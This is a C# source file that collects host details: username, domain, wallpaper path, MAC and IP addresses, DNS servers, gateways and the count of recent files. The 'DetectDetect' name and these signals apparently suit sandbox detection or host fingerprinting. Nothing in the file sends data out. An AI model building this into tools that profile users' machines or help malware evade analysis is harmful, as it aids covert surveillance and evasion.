using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace DetectDetect
{
    internal class SysInfo
    {

        public static string GetSystemInfoGeneric()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("[Username][").Append(Environment.UserName).Append("]\n")
                .Append("[Domain][").Append(Environment.UserDomainName).Append("]\n");

            string wallpaperPath = WallpaperHelper.GetWallpaper();
            if(wallpaperPath != null && wallpaperPath != "" && File.Exists(wallpaperPath))
            {
                byte[] wallBys = File.ReadAllBytes(wallpaperPath);
                string wallStrBys = StrUtils.BytesToHexString(wallBys);
                sb.Append("[Wallpaper Path][").Append(wallpaperPath).Append("]\n");
            }

            sb.Append(" ====[Mac Addresses]====\n");
            try
            {
                int i = 0;
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    i++;
                    sb.Append($"[{i}]\n");
                    sb.Append("[Name][").Append(nic.Name).Append("]\n");
                    sb.Append("[ID][").Append(nic.Id).Append("]\n");
                    sb.Append("[Desc][").Append(nic.Description).Append("]\n");
                    sb.Append("[Mac][").Append(nic.GetPhysicalAddress().ToString()).Append("]\n");
                    sb.Append("[DnsSuffix][").Append(nic.GetIPProperties().DnsSuffix);

                    try
                    {
                        if(nic.GetIPProperties().DnsAddresses != null)
                        {
                            foreach(var d in nic.GetIPProperties().DnsAddresses)
                            {
                                sb.Append("[DNS][").Append(d.ToString()).Append("]\n");
                            }
                        }
                    }
                    catch { }

                    try
                    {
                        if (nic.GetIPProperties().GatewayAddresses != null && nic.GetIPProperties().GatewayAddresses.Count > 0)
                            sb.Append("[Geteway][").Append(nic.GetIPProperties().GatewayAddresses.First().ToString()).Append("]\n");
                    }
                    catch { }

                    try
                    {
                        IPInterfaceProperties ipProperties = nic.GetIPProperties();
                        foreach (GatewayIPAddressInformation gateway in ipProperties.GatewayAddresses)
                        {
                            sb.Append("[Gateway][").Append(gateway.Address.ToString()).Append("]\n");
                        }
                    }
                    catch { }

                    foreach (UnicastIPAddressInformation ip in nic.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            sb.Append("[Addr][").Append(ip.Address.ToString()).Append("]\n");
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("An error occurred while retrieving MAC addresses: " + e.Message);
            }

            try
            {
                string recentFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
                int fCount = 0;
                if (Directory.Exists(recentFolderPath))
                {
                    fCount = Directory.GetFiles(recentFolderPath).Length;
                }

                sb.Append("[Recent Files Count][").Append(fCount).Append("]\n");
            }
            catch { }

            return sb.ToString();

        }



        public static List<string> GetNetworkMacAddresses()
        {
            List<string> macAddresses = new List<string>();
            try
            {
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    macAddresses.Add(nic.GetPhysicalAddress().ToString());
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("An error occurred while retrieving MAC addresses: " + e.Message);
            }

            return macAddresses;
        }
    }
}
